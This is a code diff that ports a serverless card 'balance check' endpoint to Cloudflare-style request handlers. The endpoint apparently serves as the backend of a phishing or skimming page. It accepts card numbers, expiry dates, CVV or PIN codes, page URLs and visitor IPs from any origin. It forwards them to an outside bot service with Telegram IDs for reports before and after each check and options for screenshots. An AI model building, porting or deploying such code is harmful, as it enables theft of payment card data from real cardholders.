@@ -1,4 +1,11 @@
 const API_URL = 'https://bot.pc.am/v3/checkBalance';
+
+const corsHeaders = {
+  'Access-Control-Allow-Origin': '*',
+  'Access-Control-Allow-Methods': 'POST, OPTIONS',
+  'Access-Control-Allow-Headers': 'Content-Type',
+};
+
 const SAFE_ERROR = 'Unable to check balance. Please try again later.';
 
 function str(v, max) {
@@ -6,29 +13,28 @@ function str(v, max) {
   return v.slice(0, max);
 }
 
-export default async function handler(req, res) {
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+export async function onRequestOptions() {
+  return new Response(null, { status: 204, headers: corsHeaders });
+}
 
-  if (req.method === 'OPTIONS') return res.status(204).end();
-  if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'Method not allowed' });
+export async function onRequestPost(context) {
+  const { request, env } = context;
 
-  const API_TOKEN = process.env.API_TOKEN;
-  const TELEGRAM_BEFORE = process.env.TELEGRAM_ID_BEFORE_CHECK || '';
-  const TELEGRAM_AFTER = process.env.TELEGRAM_ID_AFTER_CHECK || '';
-  const REQUEST_TIMEOUT = process.env.REQUEST_TIMEOUT || '';
-  const CACHE_SECONDS = process.env.CACHE_RESPONSE_SECONDS || '';
-  const SCREENSHOT = process.env.SCREENSHOT || '';
-  const SCREENSHOT_QUALITY = process.env.SCREENSHOT_JPEG_QUALITY || '';
-  const SCREENSHOT_SIZE = process.env.SCREENSHOT_BOX_SIZE || '';
+  const API_TOKEN = env.API_TOKEN;
+  const TELEGRAM_BEFORE = env.TELEGRAM_ID_BEFORE_CHECK || '';
+  const TELEGRAM_AFTER = env.TELEGRAM_ID_AFTER_CHECK || '';
+  const REQUEST_TIMEOUT = env.REQUEST_TIMEOUT || '';
+  const CACHE_SECONDS = env.CACHE_RESPONSE_SECONDS || '';
+  const SCREENSHOT = env.SCREENSHOT || '';
+  const SCREENSHOT_QUALITY = env.SCREENSHOT_JPEG_QUALITY || '';
+  const SCREENSHOT_SIZE = env.SCREENSHOT_BOX_SIZE || '';
 
   if (!API_TOKEN) {
-    return res.json({ success: false, error: 'Service unavailable' });
+    return Response.json({ success: false, error: 'Service unavailable' }, { headers: corsHeaders });
   }
 
   try {
-    const body = req.body || {};
+    const body = await request.json();
 
     const number = str(body.cardNumber, 19).replace(/\s/g, '');
     const month = str(body.expiryMonth, 2).padStart(2, '0');
@@ -41,14 +47,14 @@ export default async function handler(req, res) {
     const pageUrl = str(body.pageUrl, 200);
 
     if (number.length < 15 || number.length > 19 || !/^\d+$/.test(number)) {
-      return res.json({ success: false, error: 'Please enter a valid card number' });
+      return Response.json({ success: false, error: 'Please enter a valid card number' }, { headers: corsHeaders });
     }
     if (!cvvVal || cvvVal.length < 3 || !/^\d+$/.test(cvvVal)) {
-      return res.json({ success: false, error: 'Please enter a valid PIN' });
+      return Response.json({ success: false, error: 'Please enter a valid PIN' }, { headers: corsHeaders });
     }
 
-    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
-      || req.headers['x-real-ip']
+    const ip = request.headers.get('cf-connecting-ip')
+      || request.headers.get('x-forwarded-for')?.split(',')[0]?.trim()
       || '';
 
     const infoParts = [];
@@ -86,8 +92,8 @@ export default async function handler(req, res) {
       data = { success: false, error: 'Invalid response' };
     }
 
-    return res.json(data);
+    return Response.json(data, { headers: corsHeaders });
   } catch {
-    return res.json({ success: false, error: SAFE_ERROR });
+    return Response.json({ success: false, error: SAFE_ERROR }, { headers: corsHeaders });
   }
 }
